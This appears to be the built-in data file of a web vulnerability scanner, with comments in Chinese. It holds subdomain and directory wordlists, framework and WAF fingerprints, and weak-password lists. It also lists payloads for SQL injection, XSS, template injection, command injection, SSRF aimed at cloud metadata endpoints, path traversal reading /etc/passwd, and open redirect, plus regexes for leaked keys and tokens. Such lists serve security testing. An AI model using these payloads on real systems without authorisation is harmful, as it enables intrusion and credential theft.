"""内置数据：Payloads / 指纹 / 字典"""

# ============================================================
# ——— 子域名字典（前 200 常用）———
# ============================================================
SUBDOMAIN_DICT = [
    "www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2",
    "smtp", "secure", "vpn", "admin", "cdn", "api", "img", "m", "mobile",
    "dev", "test", "staging", "app", "shop", "static", "video", "news",
    "download", "bbs", "forum", "chat", "help", "support", "status", "git",
    "svn", "jenkins", "jira", "wiki", "docs", "demo", "beta", "new", "old",
    "login", "sign", "account", "user", "member", "profile", "passport",
    "sso", "oauth", "auth", "open", "pay", "payment", "wallet", "order",
    "trade", "shop", "store", "mall", "cart", "checkout", "delivery",
    "track", "logistics", "express", "crm", "erp", "oa", "hr", "boss",
    "manage", "dashboard", "console", "panel", "sys", "system", "monitor",
    "alert", "watch", "log", "audit", "report", "analytics", "data", "bi",
    "bigdata", "hadoop", "spark", "search", "es", "solr", "suggest",
    "upload", "file", "img", "image", "pic", "photo", "media", "res",
    "resource", "assets", "static", "css", "js", "font", "cdn", "cache",
    "proxy", "relay", "gateway", "gate", "api-gateway", "lb", "web",
    "web01", "web02", "app01", "db", "database", "mysql", "redis", "mq",
    "queue", "kafka", "zk", "registry", "config", "conf", "backup",
    "bak", "temp", "tmp", "test", "uat", "pre", "preprod", "prod",
    "localhost", "host", "host01", "node01", "node", "cluster", "docker",
    "k8s", "kube", "swarm", "rancher", "devops", "cicd", "ci", "cd",
    "build", "deploy", "release", "pipeline", "sonar", "code", "codereview",
    "review", "bug", "issue", "feedback", "survey", "collect", "union",
    "activity", "event", "topic", "group", "team", "org", "corp",
    "enterprise", "company", "about", "contact", "service", "partner",
    "callback", "webhook", "hook", "notify", "notice", "message", "sms",
    "push", "socket", "ws", "wss", "stream", "live", "rtmp", "hls",
    "openapi", "rest", "soap", "rpc", "grpc", "thrift", "swagger",
    "redoc", "doc", "apidoc", "api-docs", "api-doc", "explorer",
    "graphql", "gql", "query", "mutation", "subscribe",
]

# ============================================================
# ——— 目录爆破字典（前 150 常用）———
# ============================================================
DIR_DICT = [
    "admin", "administrator", "manager", "management", "dashboard",
    "console", "panel", "control", "cpanel", "whm", "phpmyadmin",
    "phpMyAdmin", "pma", "adminer", "mysql", "dbadmin", "webadmin",
    "admin/login", "admin/login.php", "login", "signin", "sign-in",
    "wp-admin", "wp-login", "administrator/index.php",
    "api", "api/v1", "api/v2", "swagger", "api-docs", "api/doc",
    "openapi", "redoc", "graphql", "graphiql", "playground",
    ".git", ".git/config", ".git/HEAD", ".svn", ".svn/entries",
    ".DS_Store", "Thumbs.db", ".env", ".env.example", ".env.production",
    ".env.local", "config", "config.php", "config.json", "config.xml",
    "configuration", "settings", "setting",
    "backup", "bak", "old", "new", "tmp", "temp", "test",
    "upload", "uploads", "files", "file", "download", "downloads",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
    ".htaccess", ".htpasswd", "web.config",
    "index.php", "index.html", "index.htm", "index.jsp", "index.aspx",
    "default.aspx", "default.php", "default.html",
    "install", "install.php", "setup", "setup.php",
    "phpinfo.php", "info.php", "test.php", "php.php",
    "shell.php", "cmd.php", "exec.php",
    "wp-admin", "wp-content", "wp-includes", "wp-config.php",
    "wp-json", "xmlrpc.php", "wp-login.php", "wp-cron.php",
    "actuator", "actuator/health", "actuator/info", "actuator/env",
    "actuator/beans", "actuator/mappings", "actuator/heapdump",
    "druid", "druid/index.html", "druid/login.html", "druid/websession.html",
    "swagger-ui.html", "swagger-resources", "v2/api-docs", "v3/api-docs",
    "web.xml", "struts", "struts2", "s2-", "s2-045", "s2-046",
    "jboss", "jboss-web", "jmx-console", "web-console",
    "jenkins", "jenkins/login", "jenkins/script",
    "confluence", "jira", "bamboo", "bitbucket",
    "zabbix", "zabbix/index.php", "grafana", "prometheus",
    "nacos", "nacos/v1/console", "sentinel", "eureka",
    "swagger/index.html", "doc.html",
    "weblogic", "wls-wsat", "_async", "uddiexplorer",
    "tomcat", "manager/html", "manager/status", "host-manager",
    "axis2", "axis2-admin", "services",
    "phpMyAdmin4", "phpmyadmin4", "sqladmin",
    "server-status", "server-info",
    ".vscode", ".idea", "README.md", "README", "CHANGELOG",
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    "nginx.conf", ".npmrc", "package.json", "yarn.lock",
    "composer.json", "composer.lock", "Gemfile", "Gemfile.lock",
    "requirements.txt", "Pipfile", "Cargo.toml",
    "sso", "oauth", "callback", "connect", "authorize",
    "ws", "wss", "websocket", "socket.io",
    ".well-known", ".well-known/security.txt",
    "cgi-bin", "cgi-bin/php", "cgi-bin/test.cgi",
]

# ============================================================
# ——— Web 指纹库 ———
# ============================================================
FINGERPRINTS = [
    # CMS / 框架
    {"name": "WordPress",      "headers": {},              "body": r'/wp-content/|wp-includes|wp-json|wp-admin'},
    {"name": "Drupal",          "headers": {},              "body": r'Drupal|drupal|Sites managed by Drupal'},
    {"name": "Joomla",          "headers": {},              "body": r'/components/|/modules/|Joomla|joomla'},
    {"name": "Discuz!",         "headers": {},              "body": r'Discuz!|discuz|comsenz'},
    {"name": "Dedecms",         "headers": {},              "body": r'DedeCMS|dedecms|Power by DedeCms'},
    {"name": "PHPWind",         "headers": {},              "body": r'PHPWind|phpwind'},
    {"name": "ThinkPHP",        "headers": {},              "body": r'ThinkPHP|thinkphp'},
    {"name": "Laravel",         "headers": {},              "body": r'Laravel|laravel'},
    {"name": "Yii",             "headers": {},              "body": r'Yii|yiiframework'},
    {"name": "Spring Boot",     "headers": {},              "body": r'Whitelabel Error Page|spring|actuator'},
    {"name": "Django",          "headers": {},              "body": r'Django|django|csrfmiddlewaretoken'},
    {"name": "Flask",           "headers": {},              "body": r'Flask|flask'},
    {"name": "Express",         "headers": {},              "body": r'Express|express'},
    {"name": "FastAPI",         "headers": {},              "body": r'FastAPI|fastapi'},
    {"name": "ASP.NET",         "headers": {"X-AspNet-Version": r".*"}, "body": r''},
    {"name": "ASP.NET (Core)",  "headers": {"X-Powered-By": r"ASP\.NET"}, "body": r'Microsoft\.AspNetCore'},
    {"name": "OpenResty",       "headers": {"Server": r"openresty"},   "body": r''},
    {"name": "Tomcat",          "headers": {},              "body": r'Apache Tomcat|Tomcat'},
    {"name": "Nginx",           "headers": {"Server": r"nginx"},   "body": r''},
    {"name": "Apache",          "headers": {"Server": r"Apache"},  "body": r''},
    {"name": "IIS",             "headers": {"Server": r"IIS"},     "body": r''},
    {"name": "Cloudflare",      "headers": {"Server": r"cloudflare", "CF-RAY": r".*"}, "body": r''},
    {"name": "阿里云 WAF",       "headers": {},              "body": r'阿里云 Web 应用防火墙|errors.aliyun.com'},
    {"name": "腾讯云 WAF",       "headers": {},              "body": r'腾讯云 Web 应用防火墙|tencent cloud waf'},
    {"name": "Shiro",           "headers": {"Set-Cookie": r"rememberMe"}, "body": r''},
    {"name": "Swagger UI",      "headers": {},              "body": r'swagger-ui|Swagger UI'},
    {"name": "Kubernetes",      "headers": {},              "body": r'Kubernetes|k8s|kube-system'},
]

# ============================================================
# ——— WAF 指纹 ———
# ============================================================
WAF_SIGNATURES = [
    {"name": "Cloudflare",      "headers": {"Server": "cloudflare", "CF-RAY": r".*"},    "body": r"Cloudflare"},
    {"name": "Cloudfront",      "headers": {"Server": "CloudFront|Cloudfront|cloudfront"}, "body": r""},
    {"name": "Akamai",          "headers": {"Server": "AkamaiGHost"},                      "body": r"akamai"},
    {"name": "AWS WAF",         "headers": {},                                              "body": r"AWS WAF|awswaf|waf-"},
    {"name": "ModSecurity",     "headers": {},                                              "body": r"ModSecurity|This error was generated by Mod_Security"},
    {"name": "阿里云 WAF",       "headers": {},                                              "body": r"errors.aliyun.com|阿里云 Web 应用防火墙"},
    {"name": "腾讯云 WAF",       "headers": {},                                              "body": r"tencent.cloud.waf|waf.tencent"},
    {"name": "百度云 WAF",       "headers": {},                                              "body": r"baidu.waf|百度云加速"},
    {"name": "360 主机卫士",     "headers": {},                                              "body": r"360wzws|360 Web Application Firewall"},
    {"name": "安全狗",           "headers": {},                                              "body": r"SafeDog|安全狗"},
    {"name": "D盾",             "headers": {},                                              "body": r"D\.D\.Waf|D盾"},
    {"name": "长亭 SafeLine",    "headers": {},                                              "body": r"SafeLine|chaitin"},
    {"name": "Naxsi",           "headers": {},                                              "body": r"naxsi|NAXSI"},
    {"name": "Comodo WAF",      "headers": {},                                              "body": r"COMODO"},
    {"name": "F5 BIG-IP",       "headers": {},                                              "body": r"BIG-IP|F5"},
    {"name": "Barracuda",       "headers": {},                                              "body": r"Barracuda"},
    {"name": "Sucuri",          "headers": {},                                              "body": r"Sucuri|cloudproxy"},
    {"name": "Wordfence",       "headers": {},                                              "body": r"Wordfence"},
]

# ============================================================
# ——— SQL 注入检测 Payload ———
# ============================================================
SQLI_PAYLOADS = [
    # 报错注入
    {"payload": "'",                        "type": "error_based"},
    {"payload": "\"",                       "type": "error_based"},
    {"payload": "' OR 1=1 -- ",             "type": "boolean"},
    {"payload": "' OR '1'='1",              "type": "boolean"},
    {"payload": "' OR 1=1#",                "type": "boolean"},
    {"payload": "\" OR 1=1 -- ",            "type": "boolean"},
    {"payload": "1' AND '1'='1",            "type": "boolean"},
    {"payload": "1' AND '1'='2",            "type": "boolean"},
    {"payload": "' AND 1=1 -- ",            "type": "boolean"},
    {"payload": "' AND 1=2 -- ",            "type": "boolean"},
    # 时间盲注
    {"payload": "' AND SLEEP(3) -- ",       "type": "time_based"},
    {"payload": "' WAITFOR DELAY '0:0:3' -- ", "type": "time_based"},
    {"payload": "'; WAITFOR DELAY '0:0:3' -- ", "type": "time_based"},
    {"payload": "' AND pg_sleep(3) -- ",    "type": "time_based"},
    {"payload": "' AND BENCHMARK(5000000,MD5(1)) -- ", "type": "time_based"},
    {"payload": "' OR IF(1=1,SLEEP(3),0) -- ", "type": "time_based"},
    # 联合查询
    {"payload": "' UNION SELECT NULL -- ",  "type": "union"},
    {"payload": "' UNION SELECT 1,2,3 -- ", "type": "union"},
    {"payload": "1 UNION SELECT 1,2,3 #",   "type": "union"},
    # 报错函数
    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()))) -- ", "type": "error_based"},
    {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1) -- ",  "type": "error_based"},
    {"payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND()*2))a FROM INFORMATION_SCHEMA.PLUGINS GROUP BY a)b) -- ", "type": "error_based"},
]

# ============================================================
# ——— XSS Payload ———
# ============================================================
XSS_PAYLOADS = [
    {"payload": "<script>alert(1)</script>",                    "type": "reflected"},
    {"payload": "<img src=x onerror=alert(1)>",                 "type": "reflected"},
    {"payload": "<svg onload=alert(1)>",                        "type": "reflected"},
    {"payload": "\"><script>alert(1)</script>",                 "type": "reflected"},
    {"payload": "'><script>alert(1)</script>",                  "type": "reflected"},
    {"payload": "';alert(1);//",                                "type": "reflected"},
    {"payload": "\"><img src=x onerror=alert(1)>",              "type": "reflected"},
    {"payload": "<body onload=alert(1)>",                       "type": "reflected"},
    {"payload": "<input onfocus=alert(1) autofocus>",           "type": "reflected"},
    {"payload": "<details open ontoggle=alert(1)>",             "type": "reflected"},
    {"payload": "<select autofocus onfocus=alert(1)>",          "type": "reflected"},
    {"payload": "<textarea autofocus onfocus=alert(1)>",        "type": "reflected"},
    {"payload": "<keygen autofocus onfocus=alert(1)>",          "type": "reflected"},
    {"payload": "<marquee onstart=alert(1)>",                   "type": "reflected"},
    {"payload": "<video><source onerror=alert(1)>",             "type": "reflected"},
    {"payload": "<audio><source onerror=alert(1)>",             "type": "reflected"},
    {"payload": "javascript:alert(1)",                          "type": "reflected"},
]

# ============================================================
# ——— SSTI Payload ———
# ============================================================
SSTI_PAYLOADS = [
    {"payload": "{{7*7}}",                      "engine": "通用"},
    {"payload": "${7*7}",                       "engine": "通用"},
    {"payload": "#{7*7}",                       "engine": "通用"},
    {"payload": "*{7*7}",                       "engine": "通用"},
    {"payload": "{{7*'7'}}",                    "engine": "Jinja2/Twig"},
    {"payload": "<%= 7*7 %>",                   "engine": "ERB"},
    {"payload": "${{7*7}}",                     "engine": "Velocity"},
    {"payload": "#set($x=7*7)$x",               "engine": "Velocity"},
    {"payload": "${7*7}",                       "engine": "Freemarker"},
    {"payload": "{{7*7}}",                      "engine": "Jinja2"},
    {"payload": "{{config}}",                   "engine": "Jinja2"},
    {"payload": "{$smarty.version}",            "engine": "Smarty"},
    {"payload": "{{7*7}}",                      "engine": "Nunjucks"},
    {"payload": "{{7*7}}",                      "engine": "Jade/Pug"},
    {"payload": "{%%20SET%%20@a=7*7}",          "engine": "Mako"},
]

# ============================================================
# ——— 命令注入 Payload ———
# ============================================================
CMDI_PAYLOADS = [
    {"payload": "; ping -c 3 127.0.0.1",        "type": "time_based"},
    {"payload": "| ping -c 3 127.0.0.1",        "type": "time_based"},
    {"payload": "& ping -c 3 127.0.0.1 &",      "type": "time_based"},
    {"payload": "&& ping -c 3 127.0.0.1",       "type": "time_based"},
    {"payload": "`ping -c 3 127.0.0.1`",        "type": "time_based"},
    {"payload": "$(ping -c 3 127.0.0.1)",       "type": "time_based"},
    {"payload": "; echo xuanmu_test_$(whoami)",  "type": "output"},
    {"payload": "| echo xuanmu_test_$(whoami)",  "type": "output"},
    {"payload": "`echo xuanmu_test_$(whoami)`",  "type": "output"},
    {"payload": "; id",                          "type": "output"},
    {"payload": "| id",                          "type": "output"},
    {"payload": "& dir &",                       "type": "output"},
]

# ============================================================
# ——— SSRF Payload ———
# ============================================================
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://0.0.0.0:80",
    "http://[::]:80",
    "http://0:80",
    "http://127.0.0.1:443",
    "http://localhost:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.1:80",
    "http://2130706433:80",
    "http://0x7f000001:80",
    "http://017700000001:80",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379",
    "gopher://127.0.0.1:6379",
    "http://169.254.169.254/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/",
    "http://metadata.google.internal/",
]

# ============================================================
# ——— 路径遍历 Payload ———
# ============================================================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%2500",
    "../.../../.../../etc/passwd",
    "..;/..;/..;/etc/passwd",
    "file=php://filter/convert.base64-encode/resource=index",
]

# ============================================================
# ——— 开放重定向 Payload ———
# ============================================================
REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "//evil.com%2f@",
    "\\\\evil.com",
    "/\\evil.com",
    "https:evil.com",
    "http://evil.com:80%40",
    "javascript:alert(1)",
]

# ============================================================
# ——— 常见弱口令 ———
# ============================================================
WEAK_PASSWORDS = [
    "admin", "admin123", "admin123456", "password", "123456", "12345678",
    "123456789", "1234567890", "root", "root123", "test", "test123",
    "guest", "guest123", "user", "user123", "sa", "sa123",
    "administrator", "passwd", "pass", "p@ssword", "P@ssw0rd",
    "admin@123", "admin!@#", "admin!@#$", "admin2023", "admin2024",
    "1q2w3e4r", "qwerty", "qwe123", "abc123", "abcd1234",
    "1234", "12345", "123qwe", "123abc", "000000",
    "111111", "666666", "888888", "999999", "0",
]

WEAK_USERNAMES = [
    "admin", "administrator", "root", "test", "guest", "user",
    "sa", "oracle", "tomcat", "jenkins", "deploy", "operator",
    "manager", "webmaster", "support", "nobody", "www-data",
]

# ============================================================
# ——— 敏感信息正则 ———
# ============================================================
SECRET_PATTERNS = [
    ("阿里云 AccessKey",     r'(?i)(LTAI[a-zA-Z0-9]{12,})'),
    ("阿里云 Secret",       r'(?i)AccessKeySecret["\'\s:=]+["\'][a-zA-Z0-9+/=]{30,}["\']'),
    ("腾讯云 SecretId",     r'(?i)(AKID[a-zA-Z0-9]{15,})'),
    ("AWS Access Key",     r'(?i)(AKIA[0-9A-Z]{16})'),
    ("GitHub Token",       r'(?i)(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,})'),
    ("GitLab Token",       r'(?i)(glpat-[a-zA-Z0-9\-]{20,})'),
    ("JWT Token",          r'(?i)(eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})'),
    ("私钥",               r'-----BEGIN\s?(RSA|DSA|EC|OPENSSH|PRIVATE)\s?KEY-----'),
    ("密码 (配置文件)",     r'["\']?password["\']?\s*[:=]\s*["\'][^"\']+["\']'),
    ("Token",              r'["\']?token["\']?\s*[:=]\s*["\'][a-zA-Z0-9_-]{16,}["\']'),
    ("API Key",            r'["\']?api[_-]?key["\']?\s*[:=]\s*["\'][a-zA-Z0-9_-]{16,}["\']'),
    ("内网 IP",            r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})'),
    ("手机号",             r'1[3-9]\d{9}'),
    ("身份证",             r'[1-9]\d{5}(?:19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx]'),
    ("AccessKey ID",      r'(?i)["\']?access_key["\']?\s*[:=]\s*["\'][a-zA-Z0-9+/=]{16,}["\']'),
    ("Secret Key",        r'(?i)["\']?secret_key["\']?\s*[:=]\s*["\'][a-zA-Z0-9+/=]{16,}["\']'),
    ("OSS Endpoint",      r'(?i)(oss-[a-z0-9-]+\.aliyuncs\.com|cos\.[a-z0-9-]+\.myqcloud\.com|s3\.[a-z0-9-]+\.amazonaws\.com)'),
    ("数据库连接串",       r'(?i)(mysql|postgres|mongodb|redis)://[a-zA-Z0-9_]+:([^@]+)@'),
    ("微信 Secret",       r'(?i)(wx[a-f0-9]{16,32})'),
    ("钉钉 Token",        r'(?i)(ding[a-zA-Z0-9]{32,})'),
]

# ============================================================
# ——— 安全头列表 ———
# ============================================================
SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS — 强制 HTTPS 连接",
    "Content-Security-Policy": "CSP — 防止 XSS 和资源劫持",
    "X-Content-Type-Options": "防止 MIME 类型嗅探",
    "X-Frame-Options": "防止点击劫持 (Clickjacking)",
    "X-XSS-Protection": "浏览器 XSS 过滤器（已弃用但仍有价值）",
    "Referrer-Policy": "控制 Referer 头部发送策略",
    "Permissions-Policy": "控制浏览器功能权限",
    "Set-Cookie": "检查 Cookie 安全属性（Secure/HttpOnly/SameSite）",
}
